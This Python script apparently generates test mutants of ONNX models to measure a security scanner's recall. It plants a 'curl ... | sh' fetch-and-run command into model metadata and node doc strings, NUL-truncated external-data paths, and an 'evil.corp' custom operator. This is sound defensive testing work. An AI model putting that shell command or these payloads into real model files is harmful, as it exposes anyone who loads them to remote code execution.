"""Apply one graph mutation to a real ONNX model and keep it only if onnx.checker
accepts the result.

This is the generator half of the oracle: it must not decide what is valid, so it
writes nothing unless the checker agrees. Exit codes are part of the contract with
the Go side:

  0  mutant written
  3  the edit made the model invalid (a broken operator, not a finding)
  4  the seed itself does not load (a slice, a mis-sniffed blob) — the Go side
     drops the seed rather than producing one invalid row per operator

The mutations are the constructs sc4n's ONNX layer claims to cover: metadata and
attribute strings, external-data references in the main graph, in an If branch and
in a model-local function, and a non-standard operator domain inside a Loop body.
Each one is a model a loader accepts — that is what makes a miss a recall gap.

Graphs are mutated in place on the seed's own graph rather than rebuilt, so the
mutant stays a real model (the seed's nodes, weights and opset) with one added
construct.
"""
import json
import os
import sys
import traceback

import numpy as np
import onnx
from onnx import TensorProto, helper, numpy_helper

SHELL = "sh -c 'curl -s http://198.51.100.9/x | sh'"

# The external-data location every traversal row uses.
#
# A plain "../../../etc/passwd" cannot be used as a validity oracle: onnx.checker
# normalises the path, sees it escape the model directory and refuses the model,
# so the row would only ever measure the checker's own containment policy. This
# form is the NUL-truncation shape instead: the document says "w_ext.bin\0.txt",
# the checker finds the file it names (the C++ loader opens "w_ext.bin"), and the
# scanner reports the NUL byte as SC4N-ONNX-EXTERNAL-TRAVERSAL — because C and C++
# APIs stop at the NUL while a Python or a hand-written path join does not.
TRAVERSAL = "w_ext.bin\x00.txt"
EXTERNAL_BYTES = bytes(16)


def external_tensor(name: str) -> TensorProto:
    """A TensorProto whose bytes live outside the model, at a traversal path."""
    t = TensorProto()
    t.name = name
    t.data_type = TensorProto.UINT8
    t.dims.extend([16])
    t.data_location = TensorProto.EXTERNAL
    for k, v in (("location", TRAVERSAL), ("offset", "0"), ("length", "16")):
        e = t.external_data.add()
        e.key = k
        e.value = v
    return t


def uint8_value_info(name: str):
    vi = onnx.ValueInfoProto()
    vi.name = name
    vi.type.tensor_type.elem_type = TensorProto.UINT8
    vi.type.tensor_type.shape.dim.add().dim_value = 16
    return vi


def op_metadata_cmd(m):
    """A shell one-liner in the model's own metadata: what an installer key holds
    in the wild, and the string the loader never shows a user."""
    e = m.metadata_props.add()
    e.key = "installer"
    e.value = SHELL


def op_attr_shell_cmd(m):
    """The same string in a node's doc_string: an attribute the scanner reads in
    the attribute walk, not in the metadata walk."""
    g = m.graph
    src = g.output[0].name
    node = g.node.add()
    node.op_type = "Identity"
    node.input.append(src)
    node.output.append("shell_doc")
    node.doc_string = SHELL
    vi = g.output.add()
    vi.type.CopyFrom(g.output[0].type)
    vi.name = "shell_doc"


def _add_external_output(g, out_name: str):
    """Give the graph an initializer with a traversal path and an Identity that
    reads it into a new output, which is the shape a loader follows."""
    g.initializer.append(external_tensor("w_ext"))
    node = g.node.add()
    node.op_type = "Identity"
    node.input.append("w_ext")
    node.output.append(out_name)
    g.output.append(uint8_value_info(out_name))


def op_node_doc_traversal(m):
    _add_external_output(m.graph, "y_ext")


def op_if_subgraph_traversal(m):
    """The same external initializer, one level down: inside an If branch, which
    the runtime evaluates only when it takes that branch."""
    g = m.graph
    g.initializer.append(numpy_helper.from_array(np.array(True, dtype=bool), name="if_cond"))
    node = g.node.add()
    node.op_type = "If"
    node.input.append("if_cond")
    node.output.append("y_if")
    g.output.append(uint8_value_info("y_if"))
    for branch in ("then_branch", "else_branch"):
        sub = node.attribute.add()
        sub.name = branch
        sub.type = onnx.AttributeProto.GRAPH
        bg = sub.g
        bg.name = branch + "_g"
        _add_external_output(bg, "y_if")


def op_function_traversal(m):
    """The same external tensor as a model-local function's attribute: a body the
    checker validates as part of the document and the runtime expands inline."""
    fn = m.functions.add()
    fn.name = "fn_traversal"
    fn.domain = "sc4nlab"
    fn.input.extend(["a"])
    fn.output.extend(["b"])
    # The function must import the same opset version the model does for its
    # domain, or the checker rejects the document.
    oi = fn.opset_import.add()
    oi.domain = ""
    oi.version = next((o.version for o in m.opset_import if o.domain == ""), 13)
    attr = fn.attribute_proto.add()
    attr.name = "w"
    attr.type = onnx.AttributeProto.TENSOR
    attr.t.CopyFrom(external_tensor("w"))
    const = fn.node.add()
    const.op_type = "Constant"
    a = const.attribute.add()
    a.name = "value"
    a.type = onnx.AttributeProto.TENSOR
    a.ref_attr_name = "w"
    const.output.append("c0")
    ident = fn.node.add()
    ident.op_type = "Identity"
    ident.input.append("c0")
    ident.output.append("b")


def op_custom_domain(m):
    """An operator from a domain nothing implements, inside a Loop body: the
    construct a scanner must name because the loader cannot know what it does."""
    g = m.graph
    g.initializer.append(numpy_helper.from_array(np.array(1, dtype=np.int64), name="loop_m"))
    g.initializer.append(numpy_helper.from_array(np.array(True, dtype=bool), name="loop_cond"))
    g.initializer.append(numpy_helper.from_array(np.array(0, dtype=np.int64), name="loop_v"))
    # The domain has to be declared or the checker rejects the node outright.
    oi = m.opset_import.add()
    oi.domain = "evil.corp"
    oi.version = 1
    node = g.node.add()
    node.op_type = "Loop"
    node.input.extend(["loop_m", "loop_cond", "loop_v"])
    node.output.append("loop_out")
    body = node.attribute.add()
    body.name = "body"
    body.type = onnx.AttributeProto.GRAPH
    bg = body.g
    bg.name = "loop_body"
    it = bg.input.add()
    it.name = "iter_num"
    it.type.tensor_type.elem_type = TensorProto.INT64
    ci = bg.input.add()
    ci.name = "cond_in"
    ci.type.tensor_type.elem_type = TensorProto.BOOL
    vi = bg.input.add()
    vi.name = "v_in"
    vi.type.tensor_type.elem_type = TensorProto.INT64
    custom = bg.node.add()
    custom.op_type = "Shell"
    custom.domain = "evil.corp"
    custom.input.append("iter_num")
    custom.output.append("shell_out")
    cond_out = bg.node.add()
    cond_out.op_type = "Identity"
    cond_out.input.append("cond_in")
    cond_out.output.append("cond_out")
    v_out = bg.node.add()
    v_out.op_type = "Identity"
    v_out.input.append("v_in")
    v_out.output.append("v_out")
    co = bg.output.add()
    co.name = "cond_out"
    co.type.tensor_type.elem_type = TensorProto.BOOL
    vo = bg.output.add()
    vo.name = "v_out"
    vo.type.tensor_type.elem_type = TensorProto.INT64


def seed_ok(path) -> bool:
    try:
        # By path, not by proto: with a ModelProto the checker has no model
        # directory and resolves any external-data location against the process
        # CWD, which is not where the seed's data lives.
        onnx.checker.check_model(path)
        import onnxruntime as ort

        ort.InferenceSession(path, providers=["CPUExecutionProvider"])
        return True
    except Exception:  # noqa: BLE001
        traceback.print_exc()
        return False


OPS = {
    "metadata-cmd": op_metadata_cmd,
    "attr-shell-cmd": op_attr_shell_cmd,
    "node-doc-traversal": op_node_doc_traversal,
    "if-subgraph-traversal": op_if_subgraph_traversal,
    "function-traversal": op_function_traversal,
    "custom-domain": op_custom_domain,
}


def main() -> int:
    arg = json.load(open(sys.argv[1]))
    op = OPS[arg["op"]]
    try:
        # load_external_data=False: the model document is what is being checked and
        # mutated, and one of the mutations deliberately points outside the tree.
        model = onnx.load(arg["seed"], load_external_data=False)
    except Exception:  # noqa: BLE001
        traceback.print_exc()
        return 4
    # The seed must already be a model a loader accepts, in both modes: if the
    # unmutated bytes do not check and do not build a session, no edit to them can
    # become evidence about the scanner. Reported as "does not load" (4), so the
    # Go side drops the seed instead of emitting one invalid row per operator.
    if not seed_ok(arg["seed"]):
        return 4
    out_dir = os.path.dirname(arg["out"])
    op(model)
    # The external-data file the traversal rows reference lives beside the model,
    # because that is where a loader resolves a relative location from.
    with open(os.path.join(out_dir, "w_ext.bin"), "wb") as f:
        f.write(EXTERNAL_BYTES)
    # Saved first and checked by path: check_model(ModelProto) has no model
    # directory, so it resolves an external-data location against the CWD and
    # every traversal row would fail for the wrong reason.
    onnx.save(model, arg["out"])
    try:
        onnx.checker.check_model(arg["out"])
    except Exception:  # noqa: BLE001
        traceback.print_exc()
        os.unlink(arg["out"])
        return 3
    print("ok")
    return 0


if __name__ == "__main__":
    sys.exit(main())
